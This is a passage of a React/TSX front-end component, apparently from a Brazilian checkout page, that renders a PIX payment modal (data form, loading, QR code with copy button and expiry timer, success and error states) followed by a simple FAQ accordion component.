                    type="text"
                    placeholder="Seu nome completo"
                    maxLength={100}
                    value={formNome}
                    onChange={(e) => setFormNome(e.target.value)}
                    style={{ borderColor: formNomeErr ? '#b91c1c' : undefined }}
                  />
                  {formNomeErr && <span className="pix-form-error">{formNomeErr}</span>}
                </div>
                <div style={{ marginBottom: '20px' }}>
                  <label className="pix-form-label">E-mail</label>
                  <input
                    className="pix-form-input"
                    type="email"
                    placeholder="seu@email.com"
                    maxLength={255}
                    value={formEmail}
                    onChange={(e) => setFormEmail(e.target.value)}
                    style={{ borderColor: formEmailErr ? '#b91c1c' : undefined }}
                  />
                  {formEmailErr && <span className="pix-form-error">{formEmailErr}</span>}
                </div>
                <button className="pix-submit-btn" onClick={confirmarDadosEGerarPix}>
                  Gerar PIX →
                </button>
                <p style={{ fontSize: '11px', color: '#9ca3af', textAlign: 'center', marginTop: '12px' }}>
                  🔒 Dados usados apenas para emissão do pagamento
                </p>
              </div>
            )}

            {pixModalState === 'loading' && (
              <div className="pix-loading">
                <div className="pix-spinner"></div>
                <p style={{ color: '#374151', fontSize: '15px', fontWeight: 600 }}>Gerando seu PIX...</p>
                <p style={{ color: '#9ca3af', fontSize: '13px', marginTop: '4px' }}>Aguarde um instante</p>
              </div>
            )}

            {pixModalState === 'pix' && (
              <div className="pix-content">
                <p style={{ fontSize: '13px', color: '#6b7280', fontWeight: 600, textAlign: 'center', marginBottom: '12px' }}>
                  Escaneie o QR Code para pagar
                </p>
                <div className="pix-qr-container">
                  <Image className="pix-qr-img" src={pixQrUrl} width={200} height={200} alt="QR Code PIX" />
                </div>
                <div className="pix-code-container">
                  <span className="pix-code-text">{pixCode}</span>
                  <button className="pix-copy-btn" onClick={copiarPix}>📋 Copiar</button>
                </div>
                <div className="pix-status">
                  <div className="pix-status-dot"></div>
                  <span>Aguardando pagamento...</span>
                </div>
                <p style={{ fontSize: '12px', color: '#9ca3af', textAlign: 'center' }}>
                  QR Code expira em <strong>{pixTimer}</strong>
                </p>
              </div>
            )}

            {pixModalState === 'success' && (
              <div className="pix-success">
                <div className="pix-success-icon">🎉</div>
                <h3 className="pix-success-title">Pagamento confirmado!</h3>
                <p className="pix-success-text">Seu acesso foi liberado. Verifique seu e-mail para o login.</p>
                <button className="pix-submit-btn" onClick={fecharPixModal}>Fechar</button>
              </div>
            )}

            {pixModalState === 'error' && (
              <div className="pix-error">
                <div className="pix-error-icon">�������️</div>
                <p className="pix-error-text">{pixError || 'Erro ao gerar PIX. Tente novamente.'}</p>
                <button style={{ background: '#6b7280', color: '#fff', border: 'none', borderRadius: '12px', padding: '12px 28px', fontSize: '14px', fontWeight: 700, cursor: 'pointer' }} onClick={fecharPixModal}>
                  Fechar
                </button>
              </div>
            )}
          </div>
        </div>
      )}
    </>
  )
}

function FaqItem({ question, answer }: { question: string; answer: string }) {
  const [isOpen, setIsOpen] = useState(false)

  return (
    <div className={`faq-item ${isOpen ? 'active' : ''}`}>
      <button className="faq-question" onClick={() => setIsOpen(!isOpen)}>
        <span className="faq-icon"></span>
        {question}
      </button>
      <div className="faq-answer">{answer}</div>
    </div>
  )
}
